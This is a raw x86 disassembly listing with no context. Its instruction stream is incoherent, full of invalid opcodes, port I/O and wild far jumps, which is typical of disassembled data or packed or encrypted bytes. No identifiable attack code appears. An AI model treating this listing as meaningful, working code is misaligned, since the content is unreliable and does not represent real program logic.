  404127:	xor    eax,0x64fc3af1
  40412c:	icebp  
  40412d:	ret    0xfbce
  404130:	loope  0x4040c6
  404132:	in     eax,0xfd
  404134:	fwait
  404135:	sub    al,0xca
  404137:	pop    ebx
  404138:	mov    ecx,DWORD PTR [eax-0x6e]
  40413b:	stc    
  40413c:	enter  0x253f,0x9e
  404140:	cmp    al,0x81
  404142:	sbb    al,0x6d
  404144:	inc    ebp
  404145:	mov    BYTE PTR [esi+0x15],ah
  404148:	mov    ecx,esi
  40414a:	mov    eax,ds:0xe48a1306
  40414f:	lds    eax,FWORD PTR [ebx]
  404151:	fwait
  404152:	xor    esi,esi
  404154:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404155:	jp     0x40412a
  404157:	mov    esi,0xab88135
  40415c:	lods   al,BYTE PTR ds:[esi]
  40415d:	js     0x4041d3
  40415f:	inc    edx
  404160:	mov    ecx,0x9a8f832a
  404165:	add    ebp,eax
  404167:	or     DWORD PTR [esi-0x6e],edi
  40416a:	stos   BYTE PTR es:[edi],al
  40416b:	and    eax,0xc2983c5e
  404170:	or     DWORD PTR [ebx+0x3b3a0fb1],edi
  404176:	or     BYTE PTR [ebp+0x2de77f17],ch
  40417c:	mov    esp,0xbe3da937
  404181:	and    BYTE PTR [eax+0x22],ch
  404184:	(bad)  {k5}{z}
  404189:	inc    esp
  40418a:	add    al,0xa6
  40418c:	les    edi,FWORD PTR [ebx-0x673f89e7]
  404192:	jns    0x404190
  404194:	push   ebx
  404195:	pop    edi
  404196:	push   cs
  404197:	les    edx,FWORD PTR [ecx-0x33cab733]
  40419d:	cdq    
  40419e:	stc    
  40419f:	in     eax,dx
  4041a0:	push   es
  4041a1:	test   eax,0xa897d0a3
  4041a6:	push   ecx
  4041a7:	inc    ebx
  4041a8:	loope  0x4041ff
  4041aa:	pop    ds
  4041ab:	repz int 0xdb
  4041ae:	mov    bl,0x8d
  4041b0:	leave  
  4041b1:	xor    eax,0x4c34e48d
  4041b6:	xor    al,0xc7
  4041b8:	add    al,0xaa
  4041bb:	pop    ds
  4041bc:	fiadd  DWORD PTR [ecx]
  4041be:	or     dh,BYTE PTR [ebp+0x3f]
  4041c1:	and    al,0xb4
  4041c3:	jo     0x404159
  4041c5:	lods   al,BYTE PTR fs:[esi]
  4041c7:	push   edx
  4041c8:	push   ebx
  4041c9:	mov    ebp,esi
  4041cb:	out    0xcf,eax
  4041cd:	dec    ebp
  4041ce:	in     eax,0xb
  4041d0:	and    DWORD PTR [edi-0x70],edx
  4041d3:	cmp    eax,0xa892968
  4041d8:	(bad)  
  4041da:	fincstp 
  4041dc:	xor    edi,DWORD PTR [ebp+0x8]
  4041df:	sub    ebp,DWORD PTR [edx+0x68]
  4041e2:	jo     0x404262
  4041e4:	mov    edx,0x406a71b
  4041e9:	mov    WORD PTR [edi-0x59531c6d],ss
  4041ef:	push   cs
  4041f0:	loope  0x404255
  4041f2:	loopne 0x40418c
  4041f4:	in     al,0xfa
  4041f6:	ss in  eax,0xe4
  4041f9:	pop    ebp
  4041fa:	cmp    BYTE PTR [ecx],ch
  4041fc:	mov    ch,dl
  4041fe:	(bad)  
  4041ff:	cmp    ecx,esp
  404201:	adc    al,0xbe
  404203:	sub    al,0xa8
  404205:	mov    esi,0x3a8a7f5
  40420a:	jo     0x40426c
  40420c:	or     DWORD PTR [edi-0x1c],edx
  40420f:	outs   dx,DWORD PTR ds:[esi]
  404210:	and    DWORD PTR [eax+0x8],ebp
  404213:	dec    edi
  404214:	push   eax
  404215:	popf   
  404216:	inc    eax
  404217:	loope  0x4041c1
  404219:	xor    ebp,DWORD PTR [ebx]
  40421b:	test   eax,0x770e701e
  404220:	popa   
  404221:	mov    dl,0x72
  404223:	pop    ss
  404224:	dec    ebp
  404225:	ins    DWORD PTR es:[edi],dx
  404226:	shl    ecx,1
  404228:	xchg   esi,eax
  404229:	jae    0x404225
  40422b:	cmp    eax,0xa3be7f23
  404230:	xor    dh,BYTE PTR [ebp-0x612f8c72]
  404236:	cli    
  404237:	je     0x40424f
  404239:	inc    eax
  40423a:	cmp    eax,0x40
  40423d:	mov    DWORD PTR ds:0x42fcee,0x793d
  404247:	jmp    0x4045a7
  40424c:	leave  
  40424d:	daa    
  40424e:	rcl    BYTE PTR [esi],1
  404250:	repnz aad 0xf1
  404253:	jecxz  0x404232
  404255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404256:	dec    ebp
  404257:	movntq QWORD PTR [ebx+0x184fc2e8],mm6
  40425e:	jo     0x4042d0
  404260:	cmp    eax,0xf370707d
  404265:	cli    
  404266:	fwait
  404267:	mov    ecx,0x11e7babb
  40426c:	push   esp
  40426d:	push   edx
  40426e:	inc    edi
  40426f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404270:	cmp    al,0x4a
  404272:	xlat   BYTE PTR ds:[ebx]
  404273:	mov    edx,0x12369db7
  404278:	test   al,0x60
  40427a:	(bad)  
  40427b:	cmp    bh,BYTE PTR [ebx+0x5d]
  40427e:	pop    edi
  40427f:	mov    edi,ss
  404281:	inc    esi
  404282:	push   ss
  404283:	mov    edi,0x814b181f
  404288:	inc    edi
  404289:	mov    al,0xad
  40428b:	nop
  40428c:	jmp    0x816eb91
  404291:	aaa    
  404292:	in     eax,0xd0
  404294:	mov    al,0x79
  404296:	outs   dx,BYTE PTR ds:[esi]
  404297:	scas   eax,DWORD PTR es:[edi]
  404298:	jns    0x404246
  40429a:	mov    eax,ds:0x54702250
  40429f:	call   0x6cbb:0xae1ce393
  4042a6:	psrlw  mm6,QWORD PTR [esi+ecx*8-0x67210317]
  4042ae:	sbb    BYTE PTR [edi*8-0x35690006],dl
  4042b5:	jno    0x4042fc
  4042b7:	lock mov ch,0x46
  4042ba:	pop    eax
  4042bb:	loopne 0x40430b
  4042bd:	and    DWORD PTR [ebx-0x76],ecx
  4042c0:	in     eax,0x7
  4042c2:	add    al,BYTE PTR [ebp+0x69]
  4042c5:	dec    esp
  4042c6:	lods   eax,DWORD PTR ds:[esi]
  4042c7:	fwait
  4042c8:	or     eax,0x518d800a
  4042cd:	test   al,0x4
  4042cf:	and    al,0xce
  4042d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042d2:	ds mov dh,0xfb
  4042d5:	mov    WORD PTR [edx],?
  4042d7:	stos   BYTE PTR es:[edi],al
  4042d8:	jno    0x40434d
  4042da:	arpl   bp,di
  4042dc:	xchg   DWORD PTR [ecx+0x2cf389a5],esi
  4042e2:	add    ebp,DWORD PTR [ebx-0x70f7737c]
  4042e8:	test   DWORD PTR [edi+0x32],ebx
  4042eb:	imul   edx,DWORD PTR [edx+eiz*1+0x66],0x5b95e995
  4042f3:	loop   0x404279
  4042f5:	adc    eax,0xfb1baafd
  4042fa:	jp     0x4042e5
  4042fc:	das    
  4042fd:	fisub  DWORD PTR [edi+esi*1+0x65580535]
  404304:	shl    BYTE PTR [ecx-0x13],0x26
  404308:	inc    esi
  404309:	aam    0xf1
  40430b:	ins    BYTE PTR es:[edi],dx
  40430c:	call   0x4acd:0x4889bdd9
  404313:	xchg   DWORD PTR [ebp+0x3f3168b2],esi
  404319:	pusha  
  40431a:	xchg   esp,eax
  40431b:	jb     0x40431a
  40431d:	jbe    0x4042ca
  40431f:	rcr    DWORD PTR [eax-0x5925792c],0xfb
  404326:	sub    al,0xb7
  404328:	mov    ecx,0x5d6a45fd
  40432d:	arpl   WORD PTR [ecx+0x7a9f35b],bp
  404333:	adc    al,0x9d
  404335:	pushf  
  404336:	scas   al,BYTE PTR es:[edi]
  404337:	add    eax,0x2af661dd
  40433c:	push   ds
  40433d:	mov    ds:0x6fedf1c,eax
  404342:	dec    ebx
  404343:	test   al,0x70
  404345:	mov    ebx,0x61319414
  40434a:	clc    
  40434b:	xor    dl,bh
  40434d:	cmp    esi,DWORD PTR [edi]
  40434f:	sar    cl,1
  404351:	leave  
  404352:	push   ecx
  404353:	add    ebp,edx
  404355:	jecxz  0x4042dd
  404357:	jp     0x40432e
  404359:	sbb    cl,BYTE PTR [ebx-0x56bc7990]
  40435f:	out    dx,eax
  404360:	mov    al,ds:0x12a3aeb3
  404365:	mov    eax,0xd0d50f16
  40436a:	or     ebp,DWORD PTR [ebx+0x3ba58971]
  404370:	dec    ebx
  404371:	ins    DWORD PTR es:[edi],dx
  404372:	xchg   ebx,eax
  404373:	cmp    bl,BYTE PTR [ebx]
  404375:	out    0xf6,eax
  404377:	jp     0x40433c
  404379:	jl     0x404361
  40437b:	aas    
  40437c:	push   ebp
  40437d:	pop    edi
  40437e:	mov    ebx,0xcae13214
  404383:	iret   
  404384:	repnz or al,0x66
  404387:	ret    0x11f0
  40438a:	or     DWORD PTR [edx+eax*1+0x34],0xffffff86
  40438f:	fnstcw WORD PTR [esi+0x27af6a38]
  404395:	aaa    
  404396:	inc    edi
  404397:	xchg   ebx,eax
  404398:	and    ebx,DWORD PTR [esi-0x55e11124]
  40439e:	stos   BYTE PTR es:[edi],al
  40439f:	aam    0xe0
  4043a1:	into   
  4043a2:	fcom   QWORD PTR [edi+edx*2]
  4043a5:	(bad)
  4043a9:	pushf  
  4043aa:	jge    0x404344
  4043ac:	cdq    
  4043ad:	add    dl,dh
  4043af:	cdq    
  4043b0:	lea    ebx,[ebx-0x7c]
  4043b3:	outs   dx,BYTE PTR ds:[esi]
  4043b4:	sub    al,0x5
  4043b6:	adc    cl,BYTE PTR [ebp+0x4d]
  4043b9:	inc    esp
  4043ba:	push   esi
  4043bb:	inc    ebp
  4043bc:	(bad)  
  4043bd:	aaa    
  4043be:	ret    0xe660
  4043c1:	or     ebp,edx
  4043c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043c4:	push   esp
  4043c5:	popf   
  4043c6:	outs   dx,DWORD PTR ds:[esi]
  4043c7:	aam    0x4
  4043c9:	and    BYTE PTR [edx],al
  4043cb:	sub    dh,BYTE PTR [ecx+0x8]
  4043ce:	dec    edx
  4043cf:	cdq    
  4043d0:	mov    eax,0x3f0747f8
  4043d5:	and    dh,bh
  4043d7:	dec    ebp
  4043d8:	and    BYTE PTR [edx],dh
  4043da:	sbb    ecx,DWORD PTR [esi-0x67b27a65]
  4043e0:	ja     0x40437f
  4043e2:	mov    esp,0x705f1843
  4043e7:	cs jp  0x40440d
  4043ea:	sbb    BYTE PTR [ebx],dl
  4043ec:	push   0x50
  4043ee:	lds    esp,FWORD PTR [edi+0x6ea5eb6b]
  4043f4:	mov    ch,0x10
  4043f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043f7:	(bad)  
  4043f8:	rol    dl,cl
  4043fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043fb:	arpl   WORD PTR [ebx-0x734a34ce],di
  404401:	out    dx,eax
  404402:	int    0x8b
  404404:	adc    ebx,esi
  404406:	cli    
  404407:	cli    
  404408:	jecxz  0x4043b5
  40440a:	and    ebp,eax
  40440c:	dec    edi
  40440d:	mov    BYTE PTR [si+0x3b],cl
  404411:	mov    ds:0x8719ba50,al
  404416:	mov    esi,0x39e86ac1
  40441b:	outs   dx,DWORD PTR ds:[esi]
  40441c:	js     0x4043ed
  40441e:	mov    ch,0x5d
  404420:	sub    cl,bl
  404422:	sti    
  404423:	mov    ch,0x3e
  404425:	loopne 0x4043fb
  404427:	sub    BYTE PTR [esi+eax*4],ah
  40442a:	in     al,0xf2
  40442c:	push   es
  40442d:	je     0x4043bb
  40442f:	mov    esi,0xfb3a2529
  404434:	xlat   BYTE PTR ds:[ebx]
  404435:	and    eax,edi
  404437:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404438:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404439:	cmp    dh,BYTE PTR [ebp-0x14a862ea]
  40443f:	adc    al,0xd2
  404441:	and    al,0x97
  404443:	lods   al,BYTE PTR ds:[esi]
  404444:	repnz (bad) 
  404446:	pop    edi
  404447:	fistp  QWORD PTR [edx+0x3d]
  40444a:	sbb    al,0x7d
  40444c:	shl    BYTE PTR cs:[ecx],0x18
  404450:	popa   
  404451:	ret    0x2b0f
  404454:	and    DWORD PTR [ebx+0x52],esp
  404457:	add    bh,0x2c
  40445a:	add    al,bh
  40445c:	push   0x81a53ed4
  404461:	inc    esp
  404462:	and    al,0x6d
  404464:	sub    ebp,ecx
  404466:	xor    ecx,DWORD PTR [ecx-0x7f]
  404469:	popa   
  40446a:	out    0xba,eax
  40446c:	test   al,0xcc
  40446e:	jb     0x4043f1
  404470:	loopne 0x4044b5
  404472:	or     edx,DWORD PTR [edi-0x2b11e6f6]
  404478:	adc    BYTE PTR [esi+0x225cec54],dh
  40447e:	ret    0x3e71
  404481:	xchg   edx,eax
  404482:	sahf   
  404483:	push   ds
  404484:	mov    eax,ds:0x36b7d806
  404489:	mov    bl,0x60
  40448b:	sub    bl,ch
  40448d:	(bad)  
  40448e:	xor    dl,BYTE PTR ss:[ebx+0x5e]
  404492:	pop    ebp
  404493:	test   BYTE PTR [eax+0x5e1ea3fe],bl
  404499:	adc    DWORD PTR [ecx],0xffffffe7
  40449c:	xor    dh,BYTE PTR [eax*4+0x23469828]
  4044a3:	inc    ebx
  4044a4:	jb     0x4044a0
  4044a6:	aam    0xcb
  4044a8:	cmp    BYTE PTR [edi-0x33be08b3],ch
  4044ae:	imul   ebx,DWORD PTR [eax],0x2c76b8f6
  4044b4:	cdq    
  4044b5:	mov    cl,0x3a
  4044b7:	mov    eax,ds:0x1d5a6af6
  4044bc:	std    
  4044bd:	cli    
  4044be:	ss cdq 
  4044c0:	hlt    
  4044c1:	xor    eax,DWORD PTR [esi]
  4044c3:	sub    bl,BYTE PTR [edx]
  4044c5:	dec    ebp
  4044c6:	mov    WORD PTR [esi],cs
  4044c8:	sub    eax,0x48c7dbc1
  4044cd:	daa    
  4044ce:	xor    BYTE PTR [esi-0x43],bh
  4044d1:	pop    ss
  4044d2:	mov    al,0x65
  4044d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044d5:	sbb    DWORD PTR [ecx],0xfffffff9
  4044d8:	xor    al,0x4a
  4044da:	pop    ebx
  4044db:	cmp    DWORD PTR [edi+0x4012a25c],ebp
  4044e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044e2:	lods   eax,DWORD PTR ds:[esi]
  4044e3:	cdq    
  4044e4:	mov    bl,0xb7
  4044e6:	mov    dh,dh
  4044e8:	out    0x77,al
  4044ea:	ins    DWORD PTR es:[edi],dx
  4044eb:	dec    eax
  4044ec:	mov    cl,0x27
  4044ee:	and    eax,0x3ee74b91
  4044f3:	push   ebp
  4044f4:	lds    ecx,FWORD PTR [esp+edi*8]
  4044f7:	or     dh,BYTE PTR [ebx-0x1f52c2e9]
  4044fd:	jmp    0x1962ccc
  404502:	mov    edi,DWORD PTR [ebx-0x365f6c97]
  404508:	mov    ?,edi
  40450a:	std    
  40450b:	mov    dl,0x51
  40450d:	cld    
  40450e:	sub    eax,0x9dc5630a
  404513:	mov    ss,WORD PTR [ebx]
  404515:	sbb    DWORD PTR [eax-0x703b8ca8],ebx
  40451b:	mov    eax,ds:0xb04fcd78
  404520:	cwd    
  404522:	inc    eax
  404523:	jge    0x4044ac
  404525:	pop    ds
  404526:	xor    al,0x4d
  404528:	or     esi,ebx
  40452a:	xor    al,0xad
  40452c:	ins    DWORD PTR es:[edi],dx
  40452d:	sub    al,0xe1
  40452f:	clc    
  404530:	mov    ah,0x8b
  404532:	xor    ebp,esi
  404534:	ss gs push edx
  404537:	stos   BYTE PTR es:[edi],al
  404538:	sub    eax,0x9147fba6
  40453d:	aas    
  40453e:	rep ins BYTE PTR es:[edi],dx
  404540:	push   0x7c619e7e
  404545:	fild   WORD PTR [ecx-0x76]
  404548:	inc    eax
  404549:	daa    
  40454a:	cmp    DWORD PTR [eax],0xffffff94
  40454d:	outs   dx,BYTE PTR ds:[esi]
  40454e:	leave  
  40454f:	pop    edi
  404550:	push   0xa1220e73
  404555:	mov    BYTE PTR [ebx-0x6d],dh
  404558:	mov    ds:0x65698701,eax
  40455d:	rcl    BYTE PTR [edx],1
  40455f:	mov    edi,0xb7358edd
  404564:	push   0xb0b1509
  404569:	jmp    0x616fa1c5
  40456e:	lea    esp,[ecx]
  404570:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404571:	mov    ch,0x9a
  404573:	xchg   ebp,eax
  404574:	clc    
  404575:	shl    DWORD PTR [ebp+ebp*1-0x3b5be16],cl
  40457c:	pop    ebx
  40457d:	sub    ebx,DWORD PTR [eax-0x73f7d274]
  404583:	int    0xc0
  404585:	out    dx,al
  404586:	sahf   
  404587:	adc    eax,0xf0653ae4
  40458c:	add    bl,BYTE PTR gs:[esi-0x23]
  404590:	cmp    DWORD PTR [edi+0x2f],ebx
  404593:	lahf   
  404594:	xchg   ebx,eax
  404595:	push   esp
  404596:	push   ecx
  404597:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404598:	aad    0x5d
  40459a:	xchg   ebx,eax
  40459b:	dec    esi
  40459c:	cwde   
  40459d:	lods   al,BYTE PTR ds:[esi]
  40459e:	ja     0x4045a3
  4045a0:	fucomip st,st(3)
  4045a2:	(bad)  
  4045a3:	int3   
  4045a4:	fcmovne st,st(2)
  4045a6:	jbe    0x4045b7
  4045a8:	adc    BYTE PTR [ecx],0xf9
  4045ab:	(bad)  
  4045ac:	jmp    DWORD PTR [ecx]
  4045ae:	adc    eax,0x42fd02
  4045b3:	mov    edx,DWORD PTR [ebp-0x8]
  4045b6:	jmp    0x404916
  4045bb:	push   ss
  4045bc:	jge    0x404620
  4045be:	add    BYTE PTR [ecx+0x73],dh
  4045c1:	jb     0x4045c8
  4045c3:	inc    edi
  4045c4:	sbb    ch,BYTE PTR [ecx+edx*2]
  4045c7:	call   0x7024:0xc29f319
  4045ce:	jo     0x40460d
  4045d0:	jge    0x404642
  4045d2:	jo     0x4045db
  4045d4:	pop    ecx
  4045d5:	(bad)  
  4045d6:	jmp    0x4045ad
  4045d8:	fdivr  st,st(2)
  4045da:	xchg   edi,eax
  4045db:	aad    0x3f
  4045dd:	push   ecx
  4045de:	aad    0x1f
  4045e0:	outs   dx,BYTE PTR ds:[esi]
  4045e1:	(bad)  [esi-0xf02b755]
  4045e7:	(bad)  
  4045e8:	addr16 dec ebx
  4045ea:	jge    0x4045f2
  4045ec:	push   edx
  4045ed:	push   0x51
  4045ef:	test   al,0x3d
  4045f1:	pop    edx
  4045f2:	push   ss
  4045f3:	dec    edi
  4045f4:	xchg   esp,eax
  4045f5:	add    bh,BYTE PTR [eax+0x279cb942]
  4045fb:	pop    edi
  4045fc:	icebp  
  4045fd:	mov    ah,BYTE PTR [edi]
  4045ff:	in     eax,dx
  404600:	dec    ebp
  404601:	and    ecx,DWORD PTR [esi+0x1cf47308]
  404607:	clc    
  404608:	test   al,0x2b
  40460a:	call   0xd7f6:0x313a52de
  404611:	pusha  
  404612:	fs pop ss
  404614:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404615:	test   eax,0x59f8ab7e
  40461a:	and    eax,0x48f96dd8
  40461f:	pop    DWORD PTR [ebp+ebx*8+0x5e826f22]
  404626:	cdq    
  404627:	fcom   QWORD PTR [ecx+ecx*1]
  40462a:	and    eax,0xc6894fb1
  404630:	cwde   
  404631:	enter  0x2e79,0xed
  404635:	sub    eax,0x558fffe1
  40463a:	pusha  
  40463b:	out    0xa2,al
  40463d:	scas   eax,DWORD PTR es:[edi]
  40463e:	aas    
  40463f:	xchg   edx,eax
  404640:	dec    eax
  404641:	shr    DWORD PTR [esi],0xcb
  404644:	push   cs
  404645:	arpl   bp,ax
  404647:	stos   DWORD PTR es:[edi],eax
  404648:	xchg   edi,eax
  404649:	sbb    al,0x4e
  40464b:	les    esi,FWORD PTR [ebp+0x20]
  40464e:	test   esi,edx
  404650:	(bad)  
  404651:	xchg   edi,eax
  404652:	aaa    
  404653:	(bad)
  404656:	repz fnstsw WORD PTR [ebp-0x78]
  40465a:	inc    ecx
  40465b:	imul   ebp,DWORD PTR [edi],0xffffffc4
  40465e:	loope  0x4046a3
  404660:	inc    ebx
  404661:	test   eax,0xd20688a0
  404666:	les    eax,FWORD PTR [esi]
  404668:	test   BYTE PTR [ebp-0x2],bh
  40466b:	mov    edx,ds
  40466d:	rol    BYTE PTR ds:0xf1917c6d,1
  404673:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404674:	push   esi
  404675:	aam    0xa6
  404677:	add    eax,0x63b03652
  40467c:	mov    ds:0x2b68ae85,eax
  404681:	dec    ebp
  404682:	(bad)  
  404683:	and    dl,BYTE PTR [ecx+0x11014331]
  404689:	shl    DWORD PTR [esi+eax*4+0x45],cl
  40468d:	dec    di
  40468f:	mov    eax,ds:0xe1b9f93f
  404694:	loopne 0x4046da
  404696:	mov    esp,0xd6b05dd4
  40469b:	push   0xd07e3856
  4046a0:	test   dh,cl
  4046a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046a3:	mov    edx,0x8b33b682
  4046a8:	jle    0x4046f4
  4046aa:	iret   
  4046ab:	aaa    
  4046ac:	retf   
  4046ad:	icebp  
  4046ae:	inc    ebx
  4046af:	imul   ebp,DWORD PTR [ebx-0xa6a7a14],0x75b867a
  4046b9:	sbb    al,ch
  4046bb:	sbb    DWORD PTR [edi+0x4f],ecx
  4046be:	and    esp,DWORD PTR [edx-0x65]
  4046c1:	mov    esp,DWORD PTR [ebx+0xc]
  4046c4:	add    dh,bl
  4046c6:	xlat   BYTE PTR ds:[ebx]
  4046c7:	jg     0x4046ef
  4046c9:	dec    esi
  4046ca:	pop    ecx
  4046cb:	add    edx,DWORD PTR [edx+0x62cb95b4]
  4046d1:	outs   dx,BYTE PTR ds:[esi]
  4046d2:	jmp    FWORD PTR [esi+0x4ee61b52]
  4046d8:	sub    BYTE PTR [ebx+0x9],0xcc
  4046dc:	jmp    0x76322a1f
  4046e1:	xlat   BYTE PTR ds:[ebx]
  4046e2:	mov    edi,0x1d127a60
  4046e7:	push   edx
  4046e8:	inc    esp
  4046e9:	loope  0x40474d
  4046eb:	dec    esp
  4046ec:	xchg   esi,eax
  4046ed:	push   es
  4046ee:	lds    esi,FWORD PTR [edx+esi*8+0x1d]
  4046f2:	enter  0xb800,0x38
  4046f6:	int    0x2f
  4046f8:	mov    ds:0xdaaddb16,al
  4046fd:	fld    TBYTE PTR [ebx]
  4046ff:	fs sbb ah,dh
  404702:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404703:	popa   
  404704:	std    
  404705:	stc    
  404706:	inc    ebp
  404707:	sbb    al,0x9a
  404709:	mov    edx,0x83feb1fe
  40470e:	mov    ds:0x40f0fcea,al
  404713:	or     ch,ch
  404715:	mov    DWORD PTR [ecx+0x71],ebp
  404718:	shl    BYTE PTR [esi+eiz*1+0x1],cl
  40471c:	and    al,0xf5
  40471e:	adc    BYTE PTR [edx],ch
  404720:	mov    DWORD PTR [edx+ebp*2],0xb0473c86
  404727:	xchg   edx,eax
  404728:	stos   DWORD PTR es:[edi],eax
  404729:	call   0xb71e:0x4d702a4f
  404730:	scas   al,BYTE PTR es:[di]
  404732:	sbb    eax,0xf81bb95c
  404737:	dec    esi
  404738:	scas   eax,DWORD PTR es:[edi]
  404739:	in     eax,0x72
  40473b:	out    dx,al
  40473c:	or     eax,0xa17413e5
  404741:	mov    ds:0xe1d14a20,eax
  404746:	repnz neg ch
  404749:	sub    ch,cl
  40474b:	pop    ecx
  40474c:	sbb    dh,dl
  40474e:	mov    dl,0x9a
  404750:	adc    ah,bh
  404752:	lods   eax,DWORD PTR ds:[esi]
  404753:	scas   eax,DWORD PTR es:[edi]
  404754:	xchg   edx,eax
  404755:	fst    DWORD PTR [esi-0x5d031e40]
  40475b:	retf   0xffff
  40475e:	gs call 0xcd660b4e
  404764:	mov    bh,BYTE PTR [eax]
  404766:	pop    ebx
  404767:	enter  0xff91,0x2b
  40476b:	lds    edx,FWORD PTR [ecx-0x7c8aa400]
  404771:	shr    BYTE PTR [esp+ebx*2-0x3d],cl
  404775:	sub    eax,0x9d753770
  40477a:	fst    QWORD PTR [ebx]
  40477c:	or     BYTE PTR [ebx+0x4d],dh
  40477f:	inc    esi
  404780:	xor    cl,BYTE PTR ds:0x208349c7
  404786:	iret   
  404787:	fnstsw WORD PTR [edi]
  404789:	leave  
  40478a:	mov    eax,0x3629426c
  40478f:	pop    edi
  404790:	mov    al,ds:0x3feacb7
  404795:	sub    eax,DWORD PTR [ebx]
  404797:	and    DWORD PTR [edi-0x6b],edx
  40479a:	sub    DWORD PTR [edx],eax
  40479c:	jnp    0x404815
  40479e:	sbb    eax,0xe1844779
  4047a3:	test   BYTE PTR [esi+0x31],dh
  4047a6:	pop    edx
  4047a7:	(bad)  
  4047a8:	leave  
  4047a9:	inc    edi
  4047aa:	or     BYTE PTR [edi],ah
  4047ac:	lock pop ds
  4047ae:	add    edi,DWORD PTR [ecx]
  4047b0:	push   0xba733d4
  4047b5:	ds inc edi
  4047b7:	jae    0x4047a1
  4047b9:	xchg   DWORD PTR [edx-0x9],eax
  4047bc:	ins    BYTE PTR es:[edi],dx
  4047bd:	sub    al,0x39
  4047bf:	mov    ecx,0xc89c0a59
  4047c4:	sbb    edi,DWORD PTR [eax]
  4047c6:	(bad)  
  4047c7:	fild   WORD PTR ds:0xb156f79a
  4047cd:	test   bl,bl
  4047cf:	pop    esp
  4047d0:	cmp    esi,eax
  4047d2:	lods   al,BYTE PTR ds:[esi]
  4047d3:	ja     0x4047d7
  4047d5:	jmp    0x3c6ee8f1
  4047da:	test   al,0x49
  4047dc:	call   0xf13bd97c
  4047e1:	adc    BYTE PTR [esi],ah
  4047e3:	fnsave ds:0x5c282cf3
  4047e9:	in     eax,0x8b
  4047eb:	repz and DWORD PTR [ebp-0x5884f921],ebp
  4047f2:	stos   DWORD PTR es:[edi],eax
  4047f3:	lahf   
  4047f4:	or     ebx,edx
  4047f6:	maskmovq mm2,(bad)
  4047f7:	not    DWORD PTR [esi]
  4047f9:	dec    edi
  4047fa:	sahf   
  4047fb:	pop    ss
  4047fc:	fbld   TBYTE PTR [ebx]
  4047fe:	jbe    0x404827
  404800:	mov    eax,ds:0xbedd6006
  404805:	cwde   
  404806:	test   BYTE PTR [eax+0x48],0x9a
  40480a:	in     eax,dx
  40480b:	push   edx
  40480c:	aas    
  40480d:	(bad)  
  40480f:	arpl   WORD PTR [eax+0x73],ax
  404812:	jle    0x4047c6
  404814:	fisttp DWORD PTR [ecx+0x68]
  404817:	adc    al,BYTE PTR [esi+0x2b]
  40481a:	and    BYTE PTR [edx],ch
  40481c:	push   edi
  40481d:	xchg   bl,al
  40481f:	sti    
  404820:	sbb    BYTE PTR [esi-0x6f],dh
  404823:	adc    BYTE PTR [eax],ch
  404825:	retf   0xb798
  404828:	add    al,bl
  40482a:	ds call 0x6d7f:0x502c7ec
  404832:	jp     0x4048ab
  404834:	sbb    BYTE PTR ds:0x58c58db6,dh
  40483a:	sub    eax,0xeb5c79a7
  40483f:	lods   al,BYTE PTR ds:[esi]
  404840:	mov    eax,0x39dc5335
  404845:	in     al,dx
  404846:	stos   BYTE PTR es:[edi],al
  404847:	pop    ss
  404848:	add    BYTE PTR [eax+0x36],dl
  40484b:	xchg   BYTE PTR [ebp-0x4d],cl
  40484e:	xchg   edi,eax
  40484f:	adc    edx,esi
  404851:	sbb    al,0xcc
  404853:	jmp    0x5fde96f5
  404858:	or     BYTE PTR [ecx+eiz*8-0x25],ah
  40485c:	dec    edx
  40485d:	inc    esp
  40485e:	push   0x895cac77
  404863:	nop
  404864:	js     0x40481f
  404866:	adc    eax,0x64857b58
  40486b:	(bad)  
  40486c:	sbb    edi,edi
  40486e:	ins    BYTE PTR es:[edi],dx
  40486f:	loope  0x404857
  404871:	fmul   DWORD PTR [eax]
  404873:	out    dx,eax
  404874:	push   edx
  404875:	push   ebx
  404876:	jmp    0x82da:0xd47eb3d8
  40487d:	shl    DWORD PTR [ecx-0x66],cl
  404880:	aas    
  404881:	enter  0x24b9,0x38
  404885:	mov    edi,0xa113a4bb
  40488a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40488b:	scas   al,BYTE PTR es:[edi]
  40488c:	ja     0x404812
  40488e:	mov    ebp,0xbc94db00
  404893:	jb     0x404848
  404895:	into   
  404896:	icebp  
  404897:	mov    ecx,0xd93fa4fd
  40489c:	(bad)  
  40489d:	dec    ebp
  40489e:	dec    esp
  40489f:	icebp  
  4048a0:	inc    edx
  4048a1:	mov    cl,0x3c
  4048a3:	nop
  4048a4:	add    BYTE PTR [ebx-0x20],0x89
  4048a8:	cs hlt 
  4048aa:	xchg   esp,eax
  4048ab:	leave  
  4048ac:	cmp    esi,DWORD PTR [edx+0x59ebe6fe]
  4048b2:	adc    bl,BYTE PTR [ebx+0xd]
  4048b5:	int    0x4a
  4048b7:	out    dx,eax
  4048b8:	in     al,0xc2
  4048ba:	jmp    0x3313:0x40d2b990
  4048c1:	mov    fs,WORD PTR [ebx-0x6a3798f6]
  4048c7:	repz cmc 
  4048c9:	mov    edx,0xfec765dd
  4048ce:	add    al,0x13
  4048d0:	push   ss
  4048d1:	sub    edx,DWORD PTR [esi]
  4048d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4048d4:	sub    bl,0xd1
  4048d7:	add    eax,0x76253ad2
  4048dc:	stos   DWORD PTR es:[edi],eax
  4048dd:	int    0x7
  4048df:	lea    ecx,[ecx-0x12fb2ed3]
  4048e5:	stos   DWORD PTR es:[edi],eax
  4048e6:	inc    ebx
